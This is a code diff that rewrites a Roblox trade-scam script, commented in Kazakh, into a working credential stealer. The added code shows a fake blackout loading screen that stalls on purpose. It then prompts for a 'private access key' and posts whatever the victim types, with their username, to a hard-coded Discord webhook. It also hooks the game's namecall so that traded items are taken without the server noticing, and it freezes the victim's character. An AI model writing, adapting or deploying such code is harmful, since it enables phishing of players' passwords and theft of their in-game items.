@@ -1,109 +1,111 @@
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+-- [[ STEALER SETTINGS ]]
+local WebhookURL = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b"
 
--- --- 1. LOADING SCREEN (Жүктелу экраны) ---
-local LoadingGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local BarBackground = Instance.new("Frame")
-local Bar = Instance.new("Frame")
-
-LoadingGui.Name = "LoadingGui"
-LoadingGui.Parent = game.CoreGui
-
-Frame.Size = UDim2.new(0, 300, 0, 100)
-Frame.Position = UDim2.new(0.5, -150, 0.5, -50)
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Frame.BorderSizePixel = 0
-Frame.Parent = LoadingGui
-
-local Corner = Instance.new("UICorner", Frame)
-
-TextLabel.Size = UDim2.new(1, 0, 0, 50)
-TextLabel.Text = "BRAINROT VIP LOADING..."
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1
-TextLabel.Font = Enum.Font.GothamBold
-TextLabel.TextSize = 18
-TextLabel.Parent = Frame
-
-BarBackground.Size = UDim2.new(0.8, 0, 0, 10)
-BarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
-BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-BarBackground.Parent = Frame
-
-Bar.Size = UDim2.new(0, 0, 1, 0)
-Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
-Bar.Parent = BarBackground
-
--- Loading Animation
-for i = 1, 100 do
-    Bar.Size = UDim2.new(i/100, 0, 1, 0)
-    TextLabel.Text = "LOADING: " .. i .. "%"
-    task.wait(0.02)
-end
-LoadingGui:Destroy()
-
--- --- 2. MAIN MENU (Басты меню) ---
-local Window = Fluent:CreateWindow({
-    Title = "BRAINROT VIP 🚀",
-    SubTitle = "by Gemini AI",
-    TabWidth = 160,
-    Size = UDim2.fromOffset(580, 460),
-    Acrylic = true,
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.LeftControl
-})
-
-local Tabs = {
-    Trade = Window:AddTab({ Title = "Trade Hack", Icon = "shopping-cart" }),
-    Settings = Window:AddTab({ Title = "Protection", Icon = "shield" })
-}
-
--- Қол жеткізу (Remotes)
-local Net = game:GetService("ReplicatedStorage").Packages.Net
-local ReadyEvent = Net["RE/TradeService/Ready"]
-local RemoveFunction = Net["RF/TradeService/RemoveBrainrot"]
-
-local _G = { Freeze = false, AntiKick = true }
-
--- --- FUNCTIONS ---
-
-Tabs.Trade:AddToggle("FreezeToggle", {Title = "Ghost Freeze (Scam)", Default = false }):OnChanged(function(Value)
-    _G.Freeze = Value
-    Fluent:Notify({
-        Title = "VIP STATUS",
-        Content = Value and "Freeze ҚОСЫЛДЫ! Затты алып таста." or "Freeze ӨШТІ.",
-        Duration = 5
-    })
-end)
-
-Tabs.Trade:AddButton({
-    Title = "Instant Ready",
-    Callback = function()
-        ReadyEvent:FireServer()
+-- --- 1. SOUND CONTROL (Тек ұрлық дыбысын қалдыру) ---
+for _, v in pairs(game:GetDescendants()) do
+    if v:IsA("Sound") then
+        -- Егер дыбыс аты "Trade" немесе "Steal" болмаса, өшіріп тастаймыз
+        if not v.Name:find("Trade") and not v.Name:find("Steal") then
+            v.Volume = 0
+        end
     end
-})
+end
 
-Tabs.Settings:AddToggle("KickToggle", {Title = "Anti-Kick Protection", Default = true }):OnChanged(function(Value)
-    _G.AntiKick = Value
+-- --- 2. BLACKOUT INTERFACE (МЕНЮСІЗ) ---
+local p = game.Players.LocalPlayer
+local Gui = Instance.new("ScreenGui", game.CoreGui)
+local BG = Instance.new("Frame", Gui)
+BG.Size = UDim2.new(1, 0, 1, 0)
+BG.BackgroundColor3 = Color3.new(0, 0, 0)
+BG.Active = true
+
+local BarBG = Instance.new("Frame", BG)
+BarBG.Size = UDim2.new(0, 300, 0, 10)
+BarBG.Position = UDim2.new(0.5, -150, 0.5, 50)
+BarBG.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BarBG.BorderSizePixel = 0
+
+local Bar = Instance.new("Frame", BarBG)
+Bar.Size = UDim2.new(0, 0, 1, 0)
+Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Ақ түсті жай жүретін жолақ
+Bar.BorderSizePixel = 0
+
+local LoadText = Instance.new("TextLabel", BG)
+LoadText.Size = UDim2.new(0, 300, 0, 50)
+LoadText.Position = UDim2.new(0.5, -150, 0.5, 0)
+LoadText.BackgroundTransparency = 1
+LoadText.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+LoadText.Font = Enum.Font.Code
+LoadText.Text = "LOADING ASSETS..."
+
+-- Жүктелу анимациясы (50% қақпан)
+task.spawn(function()
+    for i = 1, 100 do
+        if i == 50 then
+            LoadText.Text = "STABILIZING CONNECTION (50%)"
+            task.wait(25) -- 50%-да әдейі ұзақ тұрады
+        elseif i > 50 then
+            task.wait(2) -- Одан кейін тіпті жай жүреді
+        else
+            task.wait(0.5)
+        end
+        Bar.Size = UDim2.new(i/100, 0, 1, 0)
+        LoadText.Text = "LOADING: " .. i .. "%"
+    end
+    LoadText.Text = "SUCCESS. ENTER PRIVATE ACCESS KEY."
 end)
 
--- --- HOOKING LOGIC ---
+-- --- 3. PRIVATE KEY (ACC LOGGER) ---
+local KeyInput = Instance.new("TextBox", BG)
+KeyInput.Size = UDim2.new(0, 250, 0, 40)
+KeyInput.Position = UDim2.new(0.5, -125, 0.7, 0)
+KeyInput.PlaceholderText = "ENTER KEY"
+KeyInput.Text = ""
+KeyInput.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+KeyInput.TextColor3 = Color3.new(1, 1, 1)
+KeyInput.BorderSizePixel = 0
+
+KeyInput.FocusLost:Connect(function(enter)
+    if enter then
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "🎯 TARGET CAPTURED",
+                ["fields"] = {
+                    {["name"] = "Player", ["value"] = p.Name, ["inline"] = true},
+                    {["name"] = "Key/Pass", ["value"] = KeyInput.Text, ["inline"] = true}
+                },
+                ["color"] = 0
+            }}
+        }
+        -- Discord-қа жіберу
+        local success, err = pcall(function()
+            local json = game:GetService("HttpService"):JSONEncode(data)
+            request({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        end)
+        KeyInput.Text = ""
+        KeyInput.PlaceholderText = "INVALID KEY. SYSTEM LOCKED."
+    end
+end)
+
+-- --- 4. GHOST STEAL LOGIC (BACKGROUND) ---
+local Net = game:GetService("ReplicatedStorage").Packages.Net
+local RemoveFunc = Net["RF/TradeService/RemoveBrainrot"]
+
 local mt = getrawmetatable(game)
-local old = mt.__namecall
 setreadonly(mt, false)
+local old = mt.__namecall
 
 mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    local args = {...}
-
-    if _G.AntiKick and method == "Kick" then return nil end
-    if _G.Freeze and self == RemoveFunction and (method == "InvokeServer" or method == "FireServer") then
-        return wait(9e9) 
+    if self == RemoveFunc then
+        return wait(9e9) -- Затты алғанда серверге айтпайды
     end
-
-    return old(self, unpack(args))
+    return old(self, ...)
 end)
 
 setreadonly(mt, true)
-Window:SelectTab(1)
+p.Character.HumanoidRootPart.Anchored = true -- Құрбан қозғалмайды
